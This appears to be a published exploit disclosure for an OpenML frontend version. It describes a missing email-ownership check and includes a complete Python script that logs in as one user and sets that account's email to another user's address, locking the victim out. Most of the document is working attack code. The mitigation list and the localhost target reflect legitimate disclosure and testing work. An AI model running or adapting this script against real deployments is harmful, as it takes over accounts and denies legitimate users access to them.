# Exploit Title: Account Lockout of Other Users via Insufficient Email Ownership Verification
# Date: 2025-06-23
# Exploit Author: Kuycheu Kung
# Vendor Homepage: https://www.openml.org/
# Software Link: https://github.com/openml/openml.org
# Version: Affected in v2.0.20241110 (Docker image: openml/frontend:dev_v2.0.20241110)
# Tested on: Ubuntu + Docker (https://github.com/openml/services/blob/main/docker-compose.yaml)
# CVE: Not assigned (pending)

"""
Vulnerability Description:
--------------------------
This vulnerability arises due to insufficient email ownership verification during the profile email update process.
An attacker controlling a user account with a lower user ID can update their email address to that of another user
with a higher user ID. The victim’s active access token becomes invalid immediately. The victim's original email becomes assigned to the attacker’s account. Consequently, the victim loses access to their original account.

Steps to Reproduce:
-------------------
1. Identify two user accounts with predictable incremental user IDs.
2. Authenticate as the account with the lower user ID by logging in to obtain a bearer token.
3. Update the account’s email address to that of the victim’s email (higher user ID).
4. The victim’s account becomes locked out as their email is now linked to the attacker’s account.

Mitigation Recommendations:
---------------------------
- Enforce email ownership verification before allowing updates to take effect.
- Prevent duplicate email addresses across user accounts.
- Avoid relying on incremental IDs as the sole basis for email association in critical workflows.
- Implement monitoring and alerting for suspicious email change activities.
"""

BASE_URL = "http://localhost:8000"
ATTACKER_EMAIL = "attacker@example.comt"
ATTACKER_PASSWORD = "ATTACKER_PASS"
VICTIM_EMAIL = "victim@example.com"

import requests

def get_token(base_url: str, email: str, password: str) -> str:
    """
    Log in with attacker credentials and return the access token.
    """
    login_url = f"{base_url}/login"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
    }
    data = {
        "email": email,
        "password": password,
    }

    response = requests.post(login_url, headers=headers, json=data)
    if response.status_code == 200:
        token = response.json().get("access_token")
        if token:
            print("[+] Successfully obtained access token.")
            return token
        else:
            print("[-] Access token not found in login response.")
            return None
    else:
        print(f"[-] Login failed with status code {response.status_code}")
        print(response.text)
        return None

def exploit_lockout(base_url: str, attacker_token: str, victim_email: str):
    """
    Update attacker account email to victim's email to cause lockout.
    """
    profile_url = f"{base_url}/profile"
    headers = {
        "Authorization": f"Bearer {attacker_token}",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
    }
    data = {
        "bio": "No Bio",
        "first_name": "Two",
        "last_name": "Two",
        "email": victim_email,
    }

    response = requests.post(profile_url, headers=headers, json=data)
    if response.status_code == 200:
        print("[+] Email update successful. Victim account likely locked out.")
    else:
        print(f"[-] Email update failed with status code: {response.status_code}")
        print(response.text)

if __name__ == "__main__":
    token = get_token(BASE_URL, ATTACKER_EMAIL, ATTACKER_PASSWORD)
    if token:
        exploit_lockout(BASE_URL, token, VICTIM_EMAIL)
    else:
        print("[-] Exploit aborted due to login failure.")